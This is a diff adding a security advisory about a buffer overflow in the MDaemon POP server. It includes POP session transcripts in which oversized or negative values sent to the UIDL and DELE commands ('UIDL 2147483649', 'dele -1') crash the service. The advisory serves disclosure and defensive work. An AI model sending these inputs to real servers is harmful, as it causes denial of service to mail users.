@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/6053/info
+
+A buffer overflow vulnerability has been reported for MDaemon. The vulnerability is due to inadequate bounds checking on some POP server commands.
+
+An attacker can exploit this vulnerability by submitting a very large integer value to some commands on the POP server. This will cause the MDaemon service to crash when attempting to process the command. 
+
++OK somedomain.com POP MDaemon 6.0.5 ready
+<MDAEMON-F200210290951.AA5138234MD2795@somedomain.com>
+USER blah
++OK blah... Recipient ok
+PASS 123456
++OK blah@somedomain.com's mailbox has 0 total messages (0 octets).
+UIDL 2147483647
+-ERR no such message
+UIDL 2147483648
++OK -2147483648 !!! Index 0 is not used
+UIDL 2147483649
+
+Connection to host lost.
+
+---
+
+user dark
++OK dark... Recipient ok
+pass ******
++OK dark@dark's mailbox has 13 total messages (2274775 octets).
+dele -1
+
+Connection to host lost. 
